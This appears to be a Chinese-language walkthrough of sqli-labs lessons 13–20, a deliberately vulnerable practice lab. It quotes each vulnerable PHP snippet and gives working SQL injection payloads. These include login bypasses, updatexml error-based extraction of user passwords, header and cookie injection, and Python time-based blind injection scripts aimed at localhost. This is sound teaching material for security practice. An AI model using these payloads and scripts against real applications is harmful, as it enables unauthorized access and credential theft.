<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&quot;) or updatexml(1,concat(0x7e,(select group_concat(id,0x7e,username,0x7e,password) from users)),0) #&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1570241395722.png" alt="1570241395722"></p>
<h2 id="Less-13-login-inject"><a href="#Less-13-login-inject" class="headerlink" title="Less-13 login inject"></a>Less-13 login inject</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
<p>这里也是sql语句拼接发生了变化,没有屏蔽报错函数,所以还可以通过报错注入</p>
<p>万能密码注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;) #&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1570241660067.png" alt="1570241660067"></p>
<p>报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&apos;) or updatexml(1,concat(0x7e,(select group_concat(id,0x7e,username,0x7e,password) from users)),0) #&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1570241747631.png" alt="1570241747631"></p>
<h2 id="Less-14-login-inject"><a href="#Less-14-login-inject" class="headerlink" title="Less-14 login inject"></a>Less-14 login inject</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>; </span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>同样是拼接…<br>万能密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1570242076248.png" alt="1570242076248"></p>
<p>报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&quot; or updatexml(1,concat(0x7e,(select group_concat(id,0x7e,username,0x7e,password) from users)),0) #&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1570242028313.png" alt="1570242028313"></p>
<h2 id="Less-15-login-inject"><a href="#Less-15-login-inject" class="headerlink" title="Less-15 login inject"></a>Less-15 login inject</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"> 		<span class="comment">//echo '&lt;font color= "#0000ff"&gt;';	</span></span><br><span class="line"> 		</span><br><span class="line"> 		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line">	<span class="comment">//echo " You Have successfully logged in\n\n " ;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="comment">//echo 'Your Login name:'. $row['username'];</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="comment">//echo 'Your Password:' .$row['password'];</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"  /&gt;'</span>;	</span><br><span class="line">	</span><br><span class="line"> 		<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line">	<span class="comment">//echo "Try again looser";</span></span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"   /&gt;'</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里屏蔽了报错语句,同样可以采用万能密码,但是不能使用报错注入了,只能使用盲注</p>
<p>万能密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1570242362924.png" alt="1570242362924"></p>
<p>盲注,这里使用时间盲注</p>
<p>直接附上脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">url = <span class="string">"http://localhost/sqli-labs/less-15/"</span></span><br><span class="line"></span><br><span class="line">dbLen = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    dbLen +=<span class="number">1</span></span><br><span class="line">    payload = <span class="string">"admin' and if(length(database())=&#123;0&#125;,sleep(3),1)#"</span>.format(dbLen)</span><br><span class="line">    datas = &#123;</span><br><span class="line">        <span class="string">"uname"</span>:payload,</span><br><span class="line">        <span class="string">"passwd"</span>:<span class="string">""</span>,</span><br><span class="line">        <span class="string">"submit"</span>:<span class="string">"Submit"</span></span><br><span class="line">    &#125;</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    res = requests.post(url,datas).text</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    print(payload,end_time - start_time)</span><br><span class="line">    <span class="keyword">if</span> (end_time - start_time) &gt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"dbLen"</span>,dbLen)</span><br><span class="line"></span><br><span class="line"><span class="comment">#猜解数据库名</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(dbLen):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">"admin' and if(ascii(mid((database()),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)#"</span>.format(str(i+<span class="number">1</span>),str(c))</span><br><span class="line">        datas = &#123;</span><br><span class="line">            <span class="string">"uname"</span>: payload,</span><br><span class="line">            <span class="string">"passwd"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="string">"submit"</span>: <span class="string">"Submit"</span></span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        res = requests.post(url, datas).text</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        print(url,datas,end_time - start_time)</span><br><span class="line">        <span class="keyword">if</span> (end_time - start_time) &gt; <span class="number">3</span>:</span><br><span class="line">            flag += chr(c)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'data:'</span>,flag)</span><br></pre></td></tr></table></figure>
<h2 id="Less-16-login-inject"><a href="#Less-16-login-inject" class="headerlink" title="Less-16 login inject"></a>Less-16 login inject</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>; </span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>这里同样屏蔽了报错语句,与上题相比只是修改了sql拼接语句,这里稍微修改下payload即可</p>
<p>万能密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) #&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1570244737713.png" alt="1570244737713"></p>
<p>盲注</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;) and if(length(database())=&#123;0&#125;,sleep(3),1)#</span><br></pre></td></tr></table></figure>
<p>修改盲注脚本的payload即可</p>
<h2 id="Less-17-update"><a href="#Less-17-update" class="headerlink" title="Less-17 update"></a>Less-17 update</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[<span class="string">'uname'</span>]);  </span><br><span class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@$sql = <span class="string">"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">    $row1 = $row[<span class="string">'username'</span>];   </span><br><span class="line">    $update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>;</span><br><span class="line">    mysql_query($update);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (mysql_error())</span><br><span class="line">        print_r(mysql_error());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag1.jpg"/&gt;'</span>;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg"/&gt;'</span>;</span><br></pre></td></tr></table></figure>
<p>可以看到<code>uname</code>这里进行了<code>check_input</code>函数过滤，并且上面的查询语句只要返回一个最终结果就可以，判断注入点存在于<code>passwd</code>处，一般通过报错和时间盲注的方式对，update语句进行注入。</p>
<p><strong>update 报错注入</strong></p>
<p>前面一切顺利</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=&apos; or updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)),0)%23</span><br></pre></td></tr></table></figure>
<p>当查询数据的时候会报错</p>
<p><img src="\img\images\sqli-lib\1569638431081.png" alt="1569638431081"></p>
<p>在同一个语句中，不能先<code>select</code>出表中的某些值，再<code>update</code>这个表</p>
<p>可以将<code>select</code>出来的结果作为派生表再<code>select</code>一遍，这样可以避免该错误(该问题只会出现在mysql中，mssql与oracle不会出现此问题)</p>
<blockquote>
<p>当SELECT语句的FROM子句中使用独立子查询时，我们将其称为派生表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; select * from (select * from table) as t;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>利用派生表后的payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=&apos; or updatexml(1,concat(&apos;#&apos;,(select * from (select group_concat(&apos;#&apos;,id,username,password) from users) as a)),0)%23</span><br></pre></td></tr></table></figure>
<p>成功注入出数据</p>
<p><img src="\img\images\sqli-lib\1569639299895.png" alt="1569639299895"></p>
<p><strong>基于时间的盲注</strong></p>
<p>在update语句中，sleep语句会以大约十倍的时间进行延时，这里我们使用<code>sleep(0.x)</code>来缩小等待时间</p>
<p><img src="\img\images\sqli-lib\1569640299552.png" alt="1569640299552"></p>
<p>构造语句，进行数据猜解</p>
<p><strong>在update语句中进行update盲注需要在where后面加条件，否则的话，就是sleep*n(受影响的数据数量)的延时</strong></p>
<p>同样是需要使用派生表查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=&apos;  where username =&apos;admin&apos; and if(ascii(substr((select * from (select group_concat(&apos;#&apos;,id,username,password) from users) as a),1,1))&gt;30,sleep(3),1)%23</span><br></pre></td></tr></table></figure>
<p>盲注脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">url = <span class="string">"http://localhost/sqli-labs/Less-17/"</span></span><br><span class="line"><span class="comment">#猜解数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">133</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">    <span class="string">"uname"</span>:<span class="string">"admin"</span>,</span><br><span class="line">    <span class="string">"passwd"</span>:<span class="string">"' where username ='admin' and if(ascii(substr((select * from (select group_concat('#',id,username,password) from users) as a),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)#"</span>.format(str(i),str(c))</span><br><span class="line">    &#125;</span><br><span class="line">        print(<span class="string">"uname="</span>+data[<span class="string">"uname"</span>]+<span class="string">"&amp;"</span>+<span class="string">"passwd="</span>+data[<span class="string">"passwd"</span>])</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        res = requests.post(url,data=data)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        <span class="keyword">if</span> (end_time - start_time) &gt; <span class="number">2.5</span>:</span><br><span class="line">            flag += chr(c)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">print(<span class="string">'data:'</span>,flag)</span><br></pre></td></tr></table></figure>
<h2 id="Less-18-insert"><a href="#Less-18-insert" class="headerlink" title="Less-18 insert"></a>Less-18 insert</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">	$uagent = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">	$IP = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">	$uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">	$passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line">	$sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">	$result1 = mysql_query($sql);</span><br><span class="line">	$row1 = mysql_fetch_array($result1);</span><br><span class="line">		<span class="keyword">if</span>($row1)</span><br><span class="line">			&#123;</span><br><span class="line">			$insert=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span>;</span><br><span class="line">			mysql_query($insert);</span><br><span class="line">			print_r(mysql_error());			</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			print_r(mysql_error());</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过精简后的代码可以看出，<code>uname</code>和<code>passwd</code>两个参数被<code>check_input</code>参数过滤，不能够被注入，而经过查询后，带入数据库进行插入的参数里面有<code>$uagent</code>和<code>$IP</code>，<code>$IP</code>这里的获取使用了<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>，这能直接获取TCP协议数据包的底层会话IP地址，它能被代理服务器或路由修改伪造，但非修改XFF头就可以更改的，那么剩下的突破点就在与<code>$uagent</code>，我们可以通过修改user-agent的方式来进行注入。</p>
<p>可以看到这里是insert注入，并且insert的结果我们看不到，而这里调用了<code>mysql_error()</code>函数，所以，这里我们同样可以使用报错注入</p>
<p>在insert注入中，我们的语句是放在values里面的，所以我们要和前面key的数量对应</p>
<p><img src="\img\images\sqli-lib\1569655471946.png" alt="1569655471946"></p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: aasdf&apos; or updatexml(1,concat(&apos;~&apos;,(database())),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569655348036.png" alt="1569655348036"></p>
<p>注入出所有数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: aasdf&apos; or updatexml(1,concat(&apos;~&apos;,(select group_concat(id,username,password) from users)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569655554750.png" alt="1569655554750"></p>
<p>这里同样可以使用基于时间的盲注</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: aasdf&apos; or if(length((select group_concat(id,username,password) from users))=120,sleep(3),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure>
<h2 id="Less-19-insert"><a href="#Less-19-insert" class="headerlink" title="Less-19 insert"></a>Less-19 insert</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$insert=<span class="string">"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')"</span>;</span><br></pre></td></tr></table></figure>
<p>Less-19与Less-18的区别在于将原来插入三个字段的数据，改成了插入两个字段，原来插入的user-agent改成了referer，注入点也就变成了referer</p>
<p>稍微修改下payload即可</p>
<p><strong>报错注入</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:aasdf&apos; or updatexml(1,concat(&apos;~&apos;,(select group_concat(id,username,password) from users)),1),&apos;&apos;)#</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569656527217.png" alt="1569656527217"></p>
<p><strong>基于时间的盲注</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:aasdf&apos; or if(length((select group_concat(id,username,password) from users))=120,sleep(3),1),&apos;&apos;)#</span><br></pre></td></tr></table></figure>
<h2 id="Less-20-cookie"><a href="#Less-20-cookie" class="headerlink" title="Less-20 cookie"></a>Less-20 cookie</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'uname'</span>]))<span class="comment">//如果cookie中没有用户名参数</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">		&#123;</span><br><span class="line">		$uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">		$passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line">		$sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">		$result1 = mysql_query($sql);</span><br><span class="line">		$row1 = mysql_fetch_array($result1);</span><br><span class="line">		$cookee = $row1[<span class="string">'username'</span>];</span><br><span class="line">			<span class="keyword">if</span>($row1)</span><br><span class="line">				&#123;</span><br><span class="line">				setcookie(<span class="string">'uname'</span>, $cookee, time()+<span class="number">3600</span>);	</span><br><span class="line">				header (<span class="string">'Location: index.php'</span>);</span><br><span class="line">				print_r(mysql_error());			</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">				print_r(mysql_error()); </span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//如果用户名中有uname参数</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))<span class="comment">//如果没有点击按钮</span></span><br><span class="line">		&#123;</span><br><span class="line">			$cookee = $_COOKIE[<span class="string">'uname'</span>];</span><br><span class="line">			$sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;<span class="comment">//查询</span></span><br><span class="line">			$result=mysql_query($sql);</span><br><span class="line">			<span class="keyword">if</span> (!$result)<span class="comment">//如果不存在就报错</span></span><br><span class="line">  				&#123;</span><br><span class="line">  				<span class="keyword">die</span>(<span class="string">'Issue with your mysql: '</span> . mysql_error());</span><br><span class="line">  				&#125;</span><br><span class="line">			$row = mysql_fetch_array($result);</span><br><span class="line">			<span class="keyword">if</span>($row)<span class="comment">//如果存在，则获取返回数据</span></span><br><span class="line">				&#123;	</span><br><span class="line">			  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>]; 	</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'Your ID:'</span> .$row[<span class="string">'id'</span>];<span class="comment">//输出id</span></span><br><span class="line">			  	&#125;</span><br><span class="line">			<span class="keyword">else</span>	</span><br><span class="line">            &#123;        </span><br><span class="line">            &#125;	</span><br><span class="line">	<span class="keyword">else</span><span class="comment">//如果没点击了按钮</span></span><br><span class="line">		&#123;</span><br><span class="line">        setcookie(<span class="string">'uname'</span>, $row1[<span class="string">'username'</span>], time()<span class="number">-3600</span>);</span><br><span class="line">        header (<span class="string">'Location: index.php'</span>);	</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过看上面精简后的代码，可以看出这段代码的流程。</p>
<ul>
<li>在登陆页面传入账号密码，进行查询，将查询结果中的username，作为cookie</li>
<li>在登陆后的页面中，会进行一个根据cookie中的用户名，进行查询，并将查询到的数据进行输出</li>
<li>在登陆后的页面，点击按钮，设置cookie为失效</li>
</ul>
<p>可以看出，刚开始的登陆页面的uname和passwd都是有过滤函数的，而登陆后的页面，则根据cookie中的值进行查询，没有任何的过滤参数，且cookie是明文保存，所以判断此处存在注入。</p>
<p>用burpsuite抓登陆后的包，在cookie处进行注入。</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=admin&apos; and 1=2 union select 1,group_concat(id,username,password),3 from users#</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569659136073.png" alt="1569659136073"></p>
